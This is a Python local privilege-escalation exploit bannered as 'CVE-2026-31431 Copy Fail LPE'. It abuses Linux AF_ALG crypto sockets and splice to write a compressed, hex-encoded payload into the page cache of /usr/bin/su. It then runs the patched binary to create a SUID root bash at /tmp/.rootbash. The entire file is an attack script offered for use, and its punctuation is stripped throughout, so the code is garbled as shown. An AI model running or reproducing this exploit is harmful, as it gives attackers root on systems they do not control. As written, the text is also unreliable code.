#!usrbinenv python3
import os, zlib, socket, ctypes, subprocess, sys

print(
  ╔══════════════════════════════════════════╗
  ║  CVE-2026-31431 - Copy Fail LPE          ║
  ║  AF_page-cache write by tegalxploiter    ║
  ╚══════════════════════════════════════════╝
)

TARGET = sys.argv[1] if len(sys.argv)  1 else usrbinsu
OUTPUT = tmp.rootbash

_libc = ctypes.CDLL(libc.so.6, use_errno=True)
_libc.splice.restype = ctypes.c_ssize_t
_libc.splice.argtypes = [
    ctypes.c_int, ctypes.POINTER(ctypes.c_long),
    ctypes.c_int, ctypes.POINTER(ctypes.c_long),
    ctypes.c_size_t, ctypes.c_uint
]

def splice(fd_in, fd_out, count, offset=None)
    if offset is not None
        off = ctypes.c_long(offset)
        return _libc.splice(fd_in, ctypes.pointer(off), fd_out, None, count, 0)
    return _libc.splice(fd_in, None, fd_out, None, count, 0)

def d(h)
    return bytes.fromhex(h)

def patch_page_cache(fd, offset, chunk)
    alg = socket.socket(38, 5, 0)
    alg.bind((aead, authencesn(hmac(sha256),cbc(aes))))
    SOL_ALG = 279
    alg.setsockopt(SOL_ALG, 1, d('0800010000000010' + '00'  32))
    alg.setsockopt(SOL_ALG, 5, None, 4)
    conn, _ = alg.accept()
    total = offset + 4
    z = d('00')
    conn.sendmsg(
        [b'x00'  4 + chunk],
        [(SOL_ALG, 3, z  4), (SOL_ALG, 2, b'x10' + z  19), (SOL_ALG, 4, b'x08' + z  3)],
        32768
    )
    r, w = os.pipe()
    splice(fd, w, total, offset=0)
    splice(r, conn.fileno(), total)
    try
        conn.recv(8 + offset)
    except Exception
        pass
    os.close(r)
    os.close(w)
    conn.close()
    alg.close()

payload_hex = (
    78daab77f57163626464800126063b0610af82c101cc7760c004
    0e0c160c301d209a154d16999e07e5c1680601086578c0f0ff86
    4c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa4999
    79fac5190c0c0c0032c310d3
)

payload = zlib.decompress(d(payload_hex))
fd = os.open(TARGET, os.O_RDONLY)

print(f[] Patching {TARGET} ({len(payload)} bytes in page cache))
i = 0
while i  len(payload)
    patch_page_cache(fd, i, payload[ii+4])
    i += 4
os.close(fd)

print(f[] Spawning root shell - {OUTPUT})
cmd = fcp binbash {OUTPUT}; chmod u+s {OUTPUT}; id.encode() + bnexitn
proc = subprocess.Popen(
    [TARGET],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE
)
out, _ = proc.communicate(cmd, timeout=10)
result = out.decode(errors=replace).strip()

if os.path.exists(OUTPUT) and os.stat(OUTPUT).st_mode & 0o4000
    print(f[+] SUCCESS {OUTPUT} is SUID root)
    print(f[+] {result})
    print(f[] Run {OUTPUT} -p)
else
    print(f[-] Failed. Output {result})
